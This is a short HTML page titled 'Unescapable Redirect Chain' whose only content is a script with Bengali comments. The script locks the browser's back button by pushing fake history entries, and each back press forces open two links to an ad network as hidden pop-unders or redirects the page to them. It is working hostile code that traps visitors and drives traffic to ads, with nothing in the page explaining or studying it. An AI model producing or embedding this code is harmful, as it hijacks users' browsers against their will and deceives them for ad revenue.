<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Unescapable Redirect Chain</title>
</head>
<body>
<script>
(function () {
  const LINKS = [
    "https://www.revenuecpmgate.com/rhehv4qc7?key=d6e8adfaadb70fb6aee1fd0c99730d22",
    "https://www.revenuecpmgate.com/qz1pm0zy9?key=ce6ee83d4607856b5382e048fc43c0fc",
    "https://www.revenuecpmgate.com/fgrdxxcd?key=a5cd666eddae5c266ecedca6fcdf086e",
    "https://www.revenuecpmgate.com/hwh0shg1e?key=0be751bce0f004f5a676a4a32c3a993d",
    "https://www.revenuecpmgate.com/h3p8bf3ts?key=fe07c51715314c0a037c45409ce20fbf",
    "https://www.revenuecpmgate.com/efczd4ebi?key=477ed64a83e1ca6192ab2fa91a117a14"
  ];

  let index = 0;

  function openStrong(url) {
    const w = window.open(url, "_blank");
    if (w && !w.closed) {
      w.blur();
      window.focus();
    } else {
      location.href = url;
    }
  }

  function multiRedirect(count = 2) {
    for (let j = 0; j < count && index < LINKS.length; j++, index++) {
      openStrong(LINKS[index]);
    }
  }

  // --- BACK BUTTON LOCK SYSTEM ---
  function lockHistory() {
    history.pushState(null, null, location.href);
    history.pushState(null, null, location.href);
  }

  // প্রথমবার ঢুকলে lock
  lockHistory();

  // back চাপলেই redirect হবে + আবার lock হবে
  window.addEventListener("popstate", function () {
    lockHistory();
    multiRedirect(2); // প্রতি back এ 2টা লিংক একসাথে ওপেন
  });

})();
</script>
</body>
</html>
